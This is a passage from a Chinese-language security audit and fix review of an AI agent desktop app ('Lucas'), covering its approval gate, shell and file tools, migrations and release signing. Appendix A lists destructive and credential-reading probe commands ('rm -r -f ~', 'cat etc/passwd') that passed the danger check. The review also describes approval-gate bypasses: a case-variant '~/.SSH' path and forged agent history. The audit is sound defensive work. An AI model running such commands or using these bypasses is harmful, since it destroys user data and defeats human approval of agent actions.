3. `testSceneRouterMatchNotScreenshotForDesktopFiles`（L53-64）：`SceneRouter.match` 会读取开发者本机的 `~/Library/Application Support/Lucas/Injection/scenes.json`（`SceneRouter.swift:69-72, 91-93`），测试结果取决于机器状态，不是封闭的单元测试。
4. 审批闸的三个测试都用**合成的** `ToolDefinition`，所以 P0-01（PDF 工具的真实定义是 `.low`）、P0-02（MCP 是 `.medium`）这类问题永远测不出来。
5. `testAllowsBenignCommands`、`testBlocks*` 只写了正向用例，没有任何绕过用例（P1-01 中的 10 种写法全都能通过）。

**必须补的测试**（按优先级）：
- 遍历 `BuiltinTools/ExtendedTools/DocumentTools/ChannelTools/MailTools/MemoryKnowledgeTools.all()` 加上一个 MCP 定义，断言每一个"会产生副作用的动作"都需要审批。
- `ApprovalBroker`：允许、拒绝、超时、微信与桌面竞争时先到先得、断开连接后 Task 被取消（P1-04）。
- `KernelStore`：在旧 schema 的库上做迁移；`migratePlaintextModelSecret` 在失败路径下不丢 Key（P1-08）。
- ShellTool 大输出（P1-03）；SMTP 头注入（P1-12）；`parseDecision` 的负例（P1-05）。
- 修好 `smoke_test.sh` 并接入 CI。

---

## 5. 生产就绪风险汇总

| 领域 | 现状 | 风险 |
|---|---|---|
| 日志 | App 和 daemon 都写在 `~/Library/Logs/Lucas`，daemon 日志被覆盖写（P2-01），没有轮转，没有等级 | 排障困难 |
| 崩溃恢复 | daemon 崩溃后 App 不会拉起（P1-10）；SIGTERM 直接 `exit(0)`（`main.swift:162-166`），靠 WAL 保证一致性；信号处理函数不安全（P2-02） | 中 |
| 数据迁移和回滚 | 没有迁移框架，没有备份，没有事务（P1-07）；App 侧从 `JaplosClone` 迁移旧目录用的是 copy，失败只记日志（`AppModel.swift:170-181`） | 高 |
| Sparkle | `SURequireSignedFeed` 和 EdDSA 都已配置，`check-updates.sh` 验签通过（`updates-monitor.log: result: OK`）；但更新后会继续用旧 daemon（P1-10），提示词也冻结在旧版（P1-09） | 高 |
| 签名和公证 | `release.sh` 有护栏（必须有 feed、签名身份、公证 profile）；`--deep` 签名（P2-08）、DMG 未公证（P2-10）、`rsync --delete`（P2-09） | 中 |

---

## 6. 前 10 项优先修复

1. **P0-01**：PDF 工具纳入审批，并禁止覆盖已有文件。
2. **P0-02**：MCP 工具默认需要审批，并识别 `readOnlyHint`。
3. **审批闸重构为默认拒绝**：由每个工具自己声明是否需要审批，默认需要；加上基于真实注册表的表驱动测试（这一项可以从根上防住 P0-01、P0-02 再出现）。
4. **P1-02**：文件读取加敏感路径拒绝表，工作区之外的读取需要审批。
5. **P1-04**：断开连接时取消 Task，并管理好 fd 所有权（"停止"必须真的停下来）。
6. **P1-03**：Shell 改为边跑边读，去掉忙等；**P1-01** 修正安全宣称，审批卡片展示完整命令。
7. **P1-07 + P1-08**：引入 `user_version` 迁移、事务和迁移前备份；修复 Key 迁移的吞错。
8. **P1-10**：daemon 版本握手，更新后自动重启；连接失败时自动拉起 daemon。
9. **P1-09**：修改提示词和场景的 override 策略，让修复能送达老用户。
10. **P1-14**：修好冒烟测试并接入 CI，补齐审批、存储、Shell 的关键测试。

（在接通微信 iLink 之前，必须先完成 P1-05。）

---

## 7. 建议删除清单

| 对象 | 位置 | 理由 |
|---|---|---|
| 25 张 runtime ledger 表及 `runtime.ledger.list/upsert/delete/tables` | `KernelStore.swift:328-339, 1832-1865`；`KernelCore.swift:762-797` | 0 行数据、0 个调用方 |
| information plane 的 RPC：`information.types/heads/processors/revisions.*`、`deliveries.*`、`situations.*`、`subscriptions.*`、`capability.delegations.*`、`context.snapshots.list`、`tool.artifacts.*`、`modules.*` 及对应表 | `KernelProtocol.swift:76-110`；`KernelCore.swift:429-738` | App 没有调用，全部 0 行（如果 `context.snapshots.upsert` 在 App 里有用就保留这一个，这里列的是 App 侧未用的部分） |
| 别名 RPC：`wechat.login.*`、`wechat.connection.*`、`wechat.connections`、`feishu.connection.*`、`feishu.configuration.*`、`mail.connection.*` | `KernelProtocol.swift:126-160`；`KernelCore.swift:800-919` | 和 `runtime.*` 重复，App 没有调用 |
| `chat.turn.append` | `KernelCore.swift:312-323` | App 没有调用，而且允许伪造 assistant/tool 历史（可以被用来做历史投毒） |
| `policy.evaluate`、`policy.grants.list`，以及装饰性的 `PolicyEngine`（如果不按 P1-13 做实） | `KernelCore.swift:204-227`；`PolicyEngine.swift` | 只有一条授权，形同虚设 |
| `runtime.knowledge.import_feishu` 桩 | `FeishuChannel.swift:352-359`；`KernelCore.swift:884-885` | 永远返回 `stub:true` |
| 模型可见的 `runtime.wechat.send_text`、`runtime.wechat.send_file` 工具，以及 `WeChatApprovalBridge` 的推送路径（在 iLink 实现之前） | `ChannelTools.swift:116-156`；`WeChatChannel.swift:237-309`；`UnixSocketServer.swift:352-356` | 永远无法送达，只会让模型白白申请审批 |
| 空壳的飞书 `auth.sqlite` 和空目录脚手架（`credentials`、`DownloadStaging`、`Caches/wechat` 等，前提是确认没有使用方） | `japlosd/main.swift:70-95` | Japlos 的形状对齐残留【推测：需逐个确认无引用】 |
| `KernelClient.locateDaemon` 里的当前目录候选和 `LUCASD_PATH`（发布构建） | `KernelClient.swift:311-321` | 开发残留，见 P2-20 |
| 死代码：`ApplicationTool.resolveApplication` 中的 `_ = url`、`FilesystemTool.allowedRoots/allowedURL` 包装、`sawLiteral` | 见 P2-19 | 无意义代码 |
| `handleStreaming` 的默认自动批准参数 | `KernelCore.swift:121` | 安全隐患，见 P2-03 |

---

## 附录 A：审计时实际执行的命令和关键输出

```
$ swift build            → Build complete! (2.44秒)  EXIT 0  warnings=8
$ swift test             → Executed 4/11/5 tests, with 0 failures   EXIT 0
$ bash scripts/smoke_test.sh → "1. kernel.status" 后失败  EXIT 1
$ sqlite3 -readonly kernel.sqlite3 "pragma user_version" → 0
$ /tmp/lucas-probe（仓库外探针）:
  CMD "rm -r -f ~"           | danger: PASS | trustroot: PASS
  CMD "find ~ -delete"       | danger: PASS | trustroot: PASS
  CMD "cd / && cat etc/passwd" | danger: PASS | trustroot: PASS
  pdf.create requiresApproval(path=~/.zshrc): false
  mcp.* requiresApproval: false
  filesystem read secrets.json requiresApproval: false
  parseDecision "ok 收到" -> approved: true
  shell 200KB output: timedOut=bool(true) exit=number(15.0) elapsed=3.3s
$ 临时 daemon + tool.invoke system.document.pdf.create path=/tmp/lucas-audit-victim.txt
  → "ok": true；文件头 25 50 44 46 2d 31 2e 33 (%PDF-1.3)
$ 临时 daemon + tool.invoke system.filesystem write
  → "error": "approval_required: tool.invoke 不能绕过审批闸…"
```

（探针和临时 daemon 用的临时目录、测试文件都已清理；临时 daemon 已通过 `kernel.shutdown` 退出。）

---

## 附录 B：第一轮修复复核（2026-10-30）

- 复核对象：工作区未提交的改动，基线 `5246a10`（33 个文件改动 +1083/−488，另有 8 个新文件）。
- 依据：Cursor 提交的完成表，加上本次复核实际执行的命令。复核期间没有修改仓库里的代码文件。

### B.1 实际执行的验证

| 检查 | 结果 |
|---|---|
| `bash scripts/ci.sh`（build + test + smoke 一条命令跑完） | **通过**，退出码 0，用时 22.5 秒；冒烟 16 步全部通过（工具数 39） |
| 在 `/tmp` 从零完整编译（`swift build --scratch-path /tmp/lucas-clean-build`） | **0 条 warning**（原来 8 条 Sendable 警告和 lock 警告都已消失） |
| 补做"先红"：`git archive 5246a10` 导出到 `/tmp/lucas-base`，用新的冒烟脚本跑旧代码 | 第 3 步（伪造 principal）、第 13 步（PDF 覆盖，文件确实被改写）、第 14 和 15 步（MCP 无审批）**在旧代码上失败**，测试有效。**第 8 步（停止后工具调用行数不变）在旧代码上照样通过，说明这条测试抓不住问题** |
| 迁移演练副本 `/tmp/lucas-migrate-drill.sqlite3` | `user_version=9`，备份文件 `.pre-migrate.bak` 在，`integrity_check=ok`。多出的 1 行是 daemon 开机写的 boot 日志（`self_healing_events` 中 boot 共 27 行）。原标准"所有表行数不变"定得过严，改为"用户数据表行数不变"后，**判定通过** |
| 仓库外探针 `/tmp/lucas-probe2` | 见 B.3 中 N1、N2、N10 的证据 |

### B.2 原审计问题的当前状态

状态说明：✅ 已关闭（复查通过）；◐ 部分修复；☐ 未修复；⏳ 代码已改但未按标准验证。

| 编号 | 状态 | 说明 |
|---|---|---|
| P0-01 | ✅ | PDF 工具 `approval=.always`、拒绝覆盖已有文件、拒绝敏感路径；冒烟第 13 步在旧代码上失败、新代码上通过 |
| P0-02 | ✅ | MCP 默认 `.always`，只有 `readOnlyHint` 且用户勾选"信任只读"时才是 `.never`；冒烟第 14、15 步在旧代码上失败、新代码上通过 |
| P1-01 | ✅ | 改口径为"提示性检查"；审批卡完整显示命令、工作目录、路径和收件人（`ApprovalPresentation.summary`） |
| P1-02 | ◐ | 敏感路径拒绝表已加，单测通过；**文件不存在时大小写变体可以绕过**（N10） |
| P1-03 | ◐ | 大输出问题已修；**命令起了后台进程时超时失效**（N2）；`ProcessPipes.drain` 仍在 async 上下文里同步 `waitUntilExit` |
| P1-04 | ◐ | 断开连接时会取消任务，FrameWriter 也有 closed 标志；**对应测试抓不住问题**（N3）；有待批审批时会干等 5 秒（N12） |
| P1-05 | ✅（转为 N8） | 判定逻辑已加固；轮询入口不传发件人，所以目前任何微信回复都不会批准 |
| P1-06 | ◐ | 锁不再跨 `await`；`status()` 读状态时仍未加锁（N11） |
| P1-07 | ◐ | `user_version`、事务、迁移前备份都已实现；其余多语句写入还没包进事务（见 P2-04） |
| P1-08 | ✅ | 写入后读回校验，不一致就保留明文；有单测 |
| P1-09 | **☐** | 新逻辑对老用户无效（N1） |
| P1-10 | ◐ | 加了版本握手和连不上时自动拉起；版本比对可能失效（N4）、重启流程有竞态（N5）、请求重试可能重复执行（N6）；升级和崩溃演练未做 |
| P1-11 | ◐ | 先走 FTS 召回、向量写入 `knowledge_vectors`，1000 篇测试通过；已有文档没有补算向量（N14） |
| P1-12 | ✅ | 头字段拒绝 CR/LF/NUL，收件人做格式校验，IMAP 引号字段也做了检查；有单测 |
| P1-13 | ⏳ | principal 改由服务端确定、签名构建默认要求 Team ID 一致、换 baseURL 不带已存 Key；**签名包上的验证没做**；每个连接都启动 codesign 子进程（N7） |
| P1-14 | ◐ | 冒烟测试已修好，ci.sh 已加，审批闸测试改为遍历真实工具；停止测试抓不住问题（N3）；冒烟不再验证 MCP 批准后能跑通（N13） |
| P2-01 | ⏳ | 改用 `O_APPEND` 打开日志；没做"连续拉起两次后检查日志"的验证 |
| P2-02 | ☐ | 信号处理函数没改（`JaplosApp.swift:284`） |
| P2-03 | ✅ | `handleStreaming` 不再有自动批准的默认值 |
| P2-04 | ☐ | 除迁移外，多语句写入仍未包进事务 |
| P2-05 | ☐ | 飞书 token 仍没有刷新逻辑 |
| P2-06 | ☐ | `mail.send` 的 confirm、draft_only 机制没改 |
| P2-07 | ◐ | 版本号统一为 `ProductVersion.marketing`，构建脚本也读取它；但没有和 `LUCAS_VERSION` 做一致性校验（N4） |
| P2-08 | ⏳ | 改为由内向外签名，未实际执行；签 Sparkle 内嵌包的方式有风险【推测】，见 B.3 N17 |
| P2-09 | ◐ | 去掉了 `--delete`；`security unlock-keychain -p` 仍然把密码暴露在命令行（`release.sh:68`） |
| P2-10 | ☐ | DMG 仍未公证 |
| P2-11 | ◐ | 改为 `__HOME__` 占位，`install-monitor.sh` 会生成真实配置；但它会改写仓库里受版本管理的 `Config/` 文件（N16） |
| P2-12 | ☐ | `.secrets` 仍在工作树内 |
| P2-13 | ◐ | 警告已清零；每个连接仍阻塞一个线程等待结果 |
| P2-14 | ◐ | 写库时超过 8KB 截断；没有保留期限 |
| P2-15 | ◐ | 支持带点的 id；stdio 子进程退出仍未被感知 |
| P2-16 | ◐ | 先用 HEAD 请求检查大小；遇到同名文件仍删除覆盖（N15） |
| P2-17 | ☐ | 符号链接 TOCTOU 未处理（只有 PDF 加了符号链接检查） |
| P2-18 | ✅ | 场景配置按修改时间和大小缓存 |
| P2-19 | ☐ | `_ = url`（`BuiltinTools.swift:254`）和 `sawLiteral`（`MailIMAPSMTP.swift:133-156`）还在 |
| P2-20 | ☐ | 只调整了查找顺序，没有加 `#if DEBUG` |

### B.3 复核中新发现的问题

| 编号 | 级别 | 问题 | 证据 |
|---|---|---|---|
| N1 | P1 | 老用户的提示词文件是早期版本复制过去的，没有哈希记录文件，新逻辑会一律当成"用户改过"，永远不覆盖。P1-09 对现有用户实际没有修好 | 本机 `~/Library/Application Support/Lucas/Prompts` 下 `.seed-sha256` 文件数为 0；`communication/wechat.md` 和内置版本不同；探针：`loaded == legacy: true` |
| N2 | P1 | Shell 命令起了后台进程并占着输出管道时，读取线程一直不结束，超时失效 | 探针：`sleep 8 & echo started`、超时 2 秒，实际耗时 8.0 秒 |
| N3 | P1 | `cancel_check.py` 在 SLOW 模式下模型根本不会发起工具调用，"行数不变"永远成立，这条测试不能证明停止有效 | `mock_model.py:141-147` 的 slow 分支没有 tool_calls；在旧代码上同样输出 "stable at 3 ✅" |
| N4 | P1 | 版本握手比较的是代码里写死的常量；`release.sh` 的 `LUCAS_VERSION` 只改 Info.plist，常量忘了改就会让新旧 daemon 被当成同一版本；同版本重新打包也区分不开 | `ProductVersion.swift`；`build-app.sh` 读取常量；`KernelClient.swift` 中 ensureRunning 的比较 |
| N5 | P1 | daemon 重启有竞态（代码路径推导，未复现）：发关闭指令后只等 0.3 秒就拉起新进程，而旧进程每 0.5 秒才检查一次关闭标志，退出时 `unlink(path)` 可能删掉新进程的 socket；多个请求同时连不上会各自拉起一个 daemon；`start()` 会无条件删除正在使用的 socket | `japlosd/main.swift:173-181`；`UnixSocketServer.start/stop`；`DaemonController.ensureRunning` |
| N6 | P2 | 请求遇到 `.transport` 错误（包括超时）会自动重试，写入类操作可能执行两遍 | `KernelClient.call` |
| N7 | P2 | 每个连接都启动两次 `codesign` 子进程，自己的 Team ID 没缓存；查对方用可执行文件路径，没用审计令牌和系统签名接口 | `UnixSocketServer.ownTeamID / teamIdentifier` |
| N8 | P2 | 微信轮询调用 `handleInboundText(text)` 时不传发件人，功能实际上是死的；可轮询仍在审批循环里每 0.6 秒跑一次（有 token 时最多阻塞 10 秒）；界面上没有绑定发件人的入口 | `WeChatApprovalBridge.swift:378-382` |
| N9 | P2 | 停用的 RPC 只停了一部分：deliveries、situations、subscriptions、capability.delegations、context.snapshots.list、tool.artifacts、modules 仍在提供 | `KernelRetiredOperations.swift` |
| N10 | P2 | 敏感路径比较区分大小写；目标文件不存在时，`~/.SSH/xxx` 可以通过检查，在不区分大小写的 APFS 上会落到 `~/.ssh` | 探针：`~/.SSH/id_rsa -> ALLOWED`（已存在的文件会被规范化成正确大小写，所以拦得住） |
| N11 | P2 | `WeChatChannel.status()` 读 `pendingVerification`、`loginSessionID` 时没加锁 | `WeChatChannel.swift:77-79` |
| N12 | P2 | 有审批在等待时点停止：任务取消不会让审批等待返回，所以服务端会先干等 5 秒，才执行 `cancelAll` | `UnixSocketServer.awaitStream` 的退出顺序 |
| N13 | P2 | 冒烟只检查 MCP 返回 `approval_required`，不再验证 MCP 工具批准后真的能执行 | `smoke_test.sh` 第 14、15 步 |
| N14 | P2 | v9 迁移没有给已有文档补算向量 | `KernelStore.migrate()` 中 v9 只设置了版本号 |
| N15 | P2 | 下载工具遇到同名文件仍直接删除覆盖 | `DocumentTools.swift` 下载部分 |
| N16 | P2 | `install-monitor.sh` 每次都把生成的真实 plist 写回仓库里受版本管理的 `Config/com.lucas.updates-check.plist`（`/Users/w` 当初就是这样被提交进去的） | `install-monitor.sh:10, 28, 73` |
| N17 | P2【推测】 | `sign_inside_out` 对 Sparkle 里的 `.xpc` 和 `Updater.app` 只签了内部可执行文件，没有把整个包当作一个单元来签；`--force` 会抹掉 Sparkle 自带的权限声明；最后的校验去掉了 `--deep`，嵌套组件签坏了也查不出来 | `build-app.sh` 中 `sign_inside_out` |

### B.4 复核结论

- 两个 P0 已关闭，审批闸的整体设计是对的。
- **当前不可发版**：N1–N5 都是 P1，升级、崩溃恢复和签名三项演练都没做。
- 后续修复按桌面上的 `Lucas-修复跟踪表-第二轮-2026-10-30.md` 推进，每一项都要在复查通过后才标记为 ✅。
